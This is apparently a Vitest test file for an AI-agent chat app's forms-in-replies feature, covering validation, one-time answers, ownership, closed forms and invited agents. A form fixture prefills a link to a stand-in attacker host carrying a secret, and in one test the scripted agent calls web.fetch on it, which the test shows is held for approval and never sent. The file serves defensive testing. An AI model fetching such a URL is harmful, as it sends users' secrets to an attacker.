import {
  type AssistantMessage,
  type Context,
  createAssistantMessageEventStream,
  type StreamFn,
} from "@openclaw/llm-core";
import { describe, expect, it } from "vitest";
import { checkUrl, type Net } from "./runtime/net.js";
import { type Harness, harness, toldTo } from "./test-support.js";

type Turn = { text?: string; call?: { name: string; args: Record<string, unknown> } };

/** A model that says what the script tells it to, turn by turn, and remembers what it was shown. */
function scripted(turns: Turn[]) {
  const seen: Context[] = [];
  let at = 0;
  const streamFn: StreamFn = (model, context) => {
    seen.push({
      systemPrompt: toldTo(context),
      messages: structuredClone(context.messages),
    });
    const turn = turns[at++] ?? { text: 'root = Stack([a])\na = Text("(script ended)")' };
    const stream = createAssistantMessageEventStream();
    const message: AssistantMessage = {
      role: "assistant",
      content: [],
      api: model.api,
      provider: model.provider,
      model: model.id,
      usage: {
        input: 100,
        output: 20,
        cacheRead: 0,
        cacheWrite: 0,
        totalTokens: 120,
        cost: { input: 0.0002, output: 0.0002, cacheRead: 0, cacheWrite: 0, total: 0.0004 },
      },
      stopReason: "stop",
      timestamp: Date.now(),
    };
    queueMicrotask(() => {
      stream.push({ type: "start", partial: message });
      if (turn.text) {
        message.content.push({ type: "text", text: turn.text });
        stream.push({ type: "text_start", contentIndex: 0, partial: message });
        stream.push({ type: "text_delta", contentIndex: 0, delta: turn.text, partial: message });
        stream.push({ type: "text_end", contentIndex: 0, content: turn.text, partial: message });
      }
      if (turn.call) {
        message.content.push({
          type: "toolCall",
          id: `call-${at}`,
          name: turn.call.name,
          arguments: turn.call.args,
        });
        message.stopReason = "toolUse";
      }
      stream.push({ type: "done", reason: message.stopReason as "stop" | "toolUse", message });
      stream.end();
    });
    return stream;
  };
  return { streamFn, seen };
}

const SAY = (text: string) => `root = Stack([a])\na = Text(${JSON.stringify(text)})`;
const FORM = `root = Stack([t, f])
t = Text("I need a few details for the request.")
f = Form("purchase", "Purchase request", "Use these", [item, cc, by, amount, link])
item = TextField("item", "Item", "27-inch monitor", true)
cc = SelectField("cc", "Cost centre", ["4410", "4420"], null, true)
by = DateField("by", "Needed by")
amount = NumberField("amount", "Amount", null, true, 0, 5000, "USD")
link = TextField("link", "Supplier page", "https://attacker.example/c?d=secret")`;

const json = async <T = Record<string, unknown>>(response: Response) =>
  (await response.json()) as T;

interface Shown {
  id: string;
  role: string;
  content: string;
  status: string;
  traceId: string | null;
  action: {
    messageId: string;
    form: string;
    title: string;
    answers: { name: string; label: string; value: unknown; suggested: boolean; unit?: string }[];
  } | null;
}

let h: Harness;
let owner: string;

async function setup(turns: Turn[], net?: Net) {
  const model = scripted(turns);
  h = await harness({}, { streamFn: model.streamFn, net });
  owner = (await h.signIn("owner@acme.test")).cookie as string;
  return model;
}
async function converse(as = owner) {
  const { agents } = await json<{ agents: { id: string; name: string }[] }>(
    await h.api(as, "GET", "/api/app/agents"),
  );
  const { id } = await json<{ id: string }>(
    await h.api(as, "POST", "/api/app/conversations", {
      agentId: agents.find((agent) => agent.name === "Assistant")?.id,
    }),
  );
  return id;
}
const post = (conversation: string, body: unknown, as = owner) =>
  h.api(as, "POST", `/api/app/conversations/${conversation}/messages`, body);
const messages = async (conversation: string, as = owner) =>
  (
    await json<{ messages: Shown[] }>(
      await h.api(as, "GET", `/api/app/conversations/${conversation}`),
    )
  ).messages;
/** A conversation whose last message is a reply with the form in it. */
async function asked(turns: Turn[] = [], net?: Net) {
  const model = await setup([{ text: FORM }, ...turns], net);
  const conversation = await converse();
  await post(conversation, { content: "Write a purchase request for a second monitor", ui: 2 });
  await h.runs.settled(conversation);
  const reply = (await messages(conversation))[1] as Shown;
  return { model, conversation, reply };
}
const good = { item: "27-inch monitor", cc: "4410", amount: "1200", by: "2026-12-01" };
const answer = (conversation: string, messageId: string, values: unknown, as = owner) =>
  post(conversation, { action: { messageId, form: "purchase", values }, ui: 2 }, as);
const code = async (response: Response) => [
  response.status,
  (await json<{ error: { code: string } }>(response)).error?.code,
];

describe("a form in a reply", () => {
  it("is answered with one message the server writes from the form's labels and the values", async () => {
    const { model, conversation, reply } = await asked([{ text: SAY("Here is the request.") }]);
    const sent = await answer(conversation, reply.id, good);
    expect(sent.status).toBe(200);
    const text = [
      'My answers to your form "Purchase request":',
      "Item: 27-inch monitor (as suggested)",
      "Cost centre: 4410",
      "Needed by: 2026-12-01",
      "Amount: 1200 USD",
      "Supplier page: (left empty)",
    ].join("\n");
    expect(await json(sent)).toMatchObject({
      userMessage: { role: "user", content: text, action: { form: "purchase" } },
    });
    await h.runs.settled(conversation);

    const all = await messages(conversation);
    expect(all.map((message) => message.role)).toEqual(["user", "assistant", "user", "assistant"]);
    expect(all[0]?.action).toBeNull();
    expect(all[2]).toMatchObject({
      content: text,
      action: {
        messageId: reply.id,
        form: "purchase",
        title: "Purchase request",
        answers: [
          { name: "item", label: "Item", value: "27-inch monitor", suggested: true },
          { name: "cc", label: "Cost centre", value: "4410", suggested: false },
          { name: "by", label: "Needed by", value: "2026-12-01", suggested: false },
          { name: "amount", label: "Amount", value: 1200, unit: "USD", suggested: false },
          { name: "link", label: "Supplier page", value: null, suggested: false },
        ],
      },
    });
    // The agent reads the same words the person sees, and nothing else of the form.
    const shown = model.seen[1] as Context;
    expect(shown.messages.at(-1)).toMatchObject({ role: "user" });
    expect(JSON.stringify(shown.messages.at(-1))).toContain("Cost centre: 4410");
    expect(JSON.stringify(shown.messages)).not.toContain("]]>openui");
    // The trace of the run that followed says the message came from a form, and which.
    const recorded = await json<{ spans: { kind: string; attributes: Record<string, unknown> }[] }>(
      await h.api(owner, "GET", `/api/traces/${all[3]?.traceId}`),
    );
    expect(recorded.spans.find((span) => span.kind === "agent")?.attributes).toMatchObject({
      form: "purchase",
      formReply: reply.id,
    });
  });

  it("refuses answers that do not fit it, and stores nothing", async () => {
    const { conversation, reply } = await asked();
    const refused = async (values: unknown, form = "purchase") =>
      code(await post(conversation, { action: { messageId: reply.id, form, values } }));
    expect(await refused({ ...good, item: "" })).toEqual([400, "invalid_form"]);
    expect(await refused({ ...good, cc: "9999" })).toEqual([400, "invalid_form"]);
    expect(await refused({ ...good, by: "next week" })).toEqual([400, "invalid_form"]);
    expect(await refused({ ...good, amount: 5001 })).toEqual([400, "invalid_form"]);
    expect(await refused({ ...good, extra: "x" })).toEqual([400, "invalid_form"]);
    expect(await refused({ ...good, link: "x".repeat(2001) })).toEqual([400, "invalid_form"]);
    expect(await refused(good, "another")).toEqual([400, "invalid_form"]);
    // Longer than any value may be: refused before the form is even looked at.
    expect(await refused({ ...good, link: "x".repeat(5000) })).toEqual([400, "invalid_request"]);
    // An answer says nothing else, and brings nothing.
    expect(
      await code(
        await post(conversation, {
          content: "And also this",
          action: { messageId: reply.id, form: "purchase", values: good },
        }),
      ),
    ).toEqual([400, "invalid_request"]);
    expect((await messages(conversation)).length).toBe(2);
  });

  it("is answered once: a second press, or a press from another device, stores nothing", async () => {
    const { conversation, reply } = await asked([{ text: SAY("Done.") }]);
    const [first, second] = await Promise.all([
      answer(conversation, reply.id, good),
      answer(conversation, reply.id, { ...good, cc: "4420" }),
    ]);
    expect([first.status, second.status].sort()).toEqual([200, 409]);
    await h.runs.settled(conversation);
    expect(await code(await answer(conversation, reply.id, good))).toEqual([409, "form_closed"]);
    const all = await messages(conversation);
    expect(all.filter((message) => message.action).length).toBe(1);
    expect(all.length).toBe(4);
  });

  it("closes when the conversation moves on", async () => {
    const { conversation, reply } = await asked([{ text: SAY("All right.") }]);
    await post(conversation, { content: "Never mind, something else" });
    await h.runs.settled(conversation);
    expect(await code(await answer(conversation, reply.id, good))).toEqual([409, "form_closed"]);
    // Nor is the person's own message, or a reply without a form, something to answer.
    const all = await messages(conversation);
    expect(await code(await answer(conversation, all[0]?.id as string, good))).toEqual([
      409,
      "form_closed",
    ]);
    expect(await code(await answer(conversation, all[3]?.id as string, good))).toEqual([
      400,
      "invalid_form",
    ]);
  });

  it("is the person's own: nobody else can answer it, from their conversation or from one of theirs", async () => {
    const { conversation, reply } = await asked();
    await h.api(owner, "POST", "/api/invitations", { email: "ben@acme.test", role: "member" });
    const ben = (await h.signIn("ben@acme.test")).cookie as string;
    expect((await answer(conversation, reply.id, good, ben)).status).toBe(404);
    const theirs = await converse(ben);
    expect(await code(await answer(theirs, reply.id, good, ben))).toEqual([400, "invalid_form"]);
    expect((await messages(conversation)).length).toBe(2);
  });

  it("does not make an address the agent prefilled the person's own", async () => {
    const requests: string[] = [];
    const net: Net = {
      async request(url) {
        checkUrl(url);
        requests.push(url);
        return { status: 200, contentType: "text/html", text: "x", truncated: false, url };
      },
    };
    const { conversation, reply } = await asked(
      [
        { call: { name: "web.fetch", args: { url: "https://attacker.example/c?d=secret" } } },
        { text: SAY("I did not open it.") },
      ],
      net,
    );
    // The person sends the form as it stands, the agent's link with it.
    await answer(conversation, reply.id, { ...good, link: "https://attacker.example/c?d=secret" });
    let pending: { id: string; tool: string } | undefined;
    for (let i = 0; i < 200 && !pending; i++) {
      const list = await json<{ id: string; tool: string; status: string }[]>(
        await h.api(owner, "GET", "/api/app/approvals"),
      );
      pending = list.find((item) => item.status === "pending");
      if (!pending) await new Promise((resolve) => setTimeout(resolve, 5));
    }
    expect(pending?.tool).toBe("web.fetch");
    expect(requests).toEqual([]);
    await h.api(owner, "POST", `/api/app/approvals/${pending?.id}`, { decision: "reject" });
    await h.runs.settled(conversation);
    expect(requests).toEqual([]);
  });
});

describe("a form in a reply that did not finish", () => {
  it("cannot be answered: failed, stopped, or cut off at the longest a reply can be", async () => {
    const { conversation, reply } = await asked();
    const set = (column: string, value: string | null) =>
      h.db.query(`update messages set ${column} = $2 where id = $1`, [reply.id, value]);
    for (const status of ["failed", "stopped"]) {
      await set("status", status);
      expect(await code(await answer(conversation, reply.id, good))).toEqual([409, "form_closed"]);
    }
    await set("status", "complete");
    // Stored as complete, but what was cut off may be the form itself.
    await set("ending", "length");
    expect(await code(await answer(conversation, reply.id, good))).toEqual([409, "form_closed"]);
    await set("ending", null);
    expect((await answer(conversation, reply.id, good)).status).toBe(200);
    await h.runs.settled(conversation);
  });
});

describe("an answer that comes too late", () => {
  it("is refused where the message is stored, and changes nothing there", async () => {
    const { conversation, reply } = await asked();
    // What an earlier reply left to go on with must survive an answer that is refused.
    await h.db.query(`update messages set resume = '{"transcript": []}'::jsonb where id = $1`, [
      reply.id,
    ]);
    const who = (
      await h.db.query<{ org_id: string; user_id: string }>(
        "select org_id, user_id from conversations where id = $1",
        [conversation],
      )
    )[0];
    const started = await h.runs.start({
      conversationId: conversation,
      orgId: who?.org_id as string,
      user: { id: who?.user_id as string, email: "owner@acme.test" },
      content: "Purchase request",
      // The reply this answers stood one place earlier than the conversation's last message.
      action: {
        record: { messageId: reply.id, form: "purchase", title: "Purchase request", answers: [] },
        replySeq: 0,
      },
    });
    expect(started).toBe("closed");
    expect((await messages(conversation)).length).toBe(2);
    const kept = await h.db.query<{ resume: unknown }>(
      "select resume from messages where id = $1",
      [reply.id],
    );
    expect(kept[0]?.resume).toEqual({ transcript: [] });
  });
});

describe("a form pressed while a run is going", () => {
  it("is told the form is closed, not that words can be added to the run", async () => {
    const { conversation, reply } = await asked([
      { call: { name: "web.fetch", args: { url: "https://elsewhere.example/page" } } },
      { text: SAY("I did not open it.") },
    ]);
    // A typed message starts a run, which stops to ask before reading an address nobody wrote.
    await post(conversation, { content: "Look that up for me" });
    let pending: { id: string } | undefined;
    for (let i = 0; i < 200 && !pending; i++) {
      const list = await json<{ id: string; status: string }[]>(
        await h.api(owner, "GET", "/api/app/approvals"),
      );
      pending = list.find((item) => item.status === "pending");
      if (!pending) await new Promise((resolve) => setTimeout(resolve, 5));
    }
    expect(pending).toBeTruthy();
    expect(await code(await answer(conversation, reply.id, good))).toEqual([409, "form_closed"]);
    await h.api(owner, "POST", `/api/app/approvals/${pending?.id}`, { decision: "reject" });
    await h.runs.settled(conversation);
    expect((await messages(conversation)).filter((message) => message.action).length).toBe(0);
  });

  it("can be answered when the reply that holds it took words added along the way", async () => {
    // The person adds words while the reply is being written; the reply then ends in a form.
    // What they added is a step of that reply, not a message after it: the form is still the
    // last thing said, and is answered.
    const model = await setup([
      { call: { name: "web.fetch", args: { url: "https://elsewhere.example/page" } } },
      { text: FORM },
      { text: SAY("Written.") },
    ]);
    const conversation = await converse();
    await post(conversation, { content: "Write a purchase request", ui: 2 });
    let pending: { id: string } | undefined;
    for (let i = 0; i < 200 && !pending; i++) {
      const list = await json<{ id: string; status: string }[]>(
        await h.api(owner, "GET", "/api/app/approvals"),
      );
      pending = list.find((item) => item.status === "pending");
      if (!pending) await new Promise((resolve) => setTimeout(resolve, 5));
    }
    const added = await post(conversation, { content: "It is for the Lisbon office" });
    expect(added.status).toBe(202);
    await h.api(owner, "POST", `/api/app/approvals/${pending?.id}`, { decision: "reject" });
    await h.runs.settled(conversation);
    const reply = (await messages(conversation))[1] as Shown;
    expect((await messages(conversation)).length).toBe(2);
    expect((await answer(conversation, reply.id, good)).status).toBe(200);
    await h.runs.settled(conversation);
    // The agent that reads the answer still has what was added before it, as the person's.
    const shown = JSON.stringify(model.seen.at(-1)?.messages);
    expect(shown).toContain("It is for the Lisbon office");
    expect(shown).toContain("Cost centre: 4410");
  });
});

describe("an answer says nothing else", () => {
  it("is refused with a skill or a file beside it", async () => {
    const { conversation, reply } = await asked();
    const action = { messageId: reply.id, form: "purchase", values: good };
    const id = "01a1e5a7-0d13-7dc1-83a5-a87aa38d4dcf";
    expect(await code(await post(conversation, { action, skills: [id] }))).toEqual([
      400,
      "invalid_request",
    ]);
    expect(await code(await post(conversation, { action, files: [id] }))).toEqual([
      400,
      "invalid_request",
    ]);
    expect((await messages(conversation)).length).toBe(2);
  });
});

/** A conversation with the Assistant whose last message is a form the invited Writer wrote. */
async function setupInvited() {
  await setup([{ text: FORM }, { text: SAY("Written.") }]);
  const conversation = await converse();
  const { agents } = await json<{ agents: { id: string; name: string }[] }>(
    await h.api(owner, "GET", "/api/app/agents"),
  );
  const writer = agents.find((agent) => agent.name === "Writer")?.id as string;
  await post(conversation, { content: "Draft a purchase request", agentId: writer, ui: 2 });
  await h.runs.settled(conversation);
  const reply = (await messages(conversation))[1] as Shown & { agentName: string };
  return { conversation, writer, reply };
}

describe("a form an invited agent put in its reply", () => {
  it("is answered to that agent, not to the conversation's own", async () => {
    const { conversation, reply } = await setupInvited();
    expect(reply.agentName).toBe("Writer");
    expect((await answer(conversation, reply.id, good)).status).toBe(200);
    await h.runs.settled(conversation);
    const all = (await messages(conversation)) as (Shown & { agentName: string })[];
    expect(all.map((message) => message.agentName)).toEqual([
      "Writer",
      "Writer",
      "Writer",
      "Writer",
    ]);
    // Once that agent is no longer the person's to run, its form is not answered to another.
    const again = await setupInvited();
    await h.db.query("update agents set state = 'suspended' where id = $1", [again.writer]);
    expect(await code(await answer(again.conversation, again.reply.id, good))).toEqual([
      409,
      "agent_unavailable",
    ]);
    expect((await messages(again.conversation)).length).toBe(2);
  });

  it("names no agent of its own", async () => {
    const { conversation, writer } = await setupInvited();
    const all = await messages(conversation);
    expect(
      await code(
        await post(conversation, {
          agentId: writer,
          action: { messageId: all[1]?.id, form: "purchase", values: good },
        }),
      ),
    ).toEqual([400, "invalid_request"]);
  });
});

describe("the component set a client draws", () => {
  it("decides whether a run is taught forms", async () => {
    const model = await setup([{ text: SAY("One.") }, { text: SAY("Two.") }]);
    const conversation = await converse();
    await post(conversation, { content: "From an older app" });
    await h.runs.settled(conversation);
    await post(conversation, { content: "From one that draws forms", ui: 2 });
    await h.runs.settled(conversation);
    expect(model.seen[0]?.systemPrompt).not.toContain("TextField(");
    expect(model.seen[0]?.systemPrompt).toContain("root = Stack");
    expect(model.seen[1]?.systemPrompt).toContain("TextField(");
    expect(model.seen[1]?.systemPrompt).toContain("ask with one Form");
  });
});
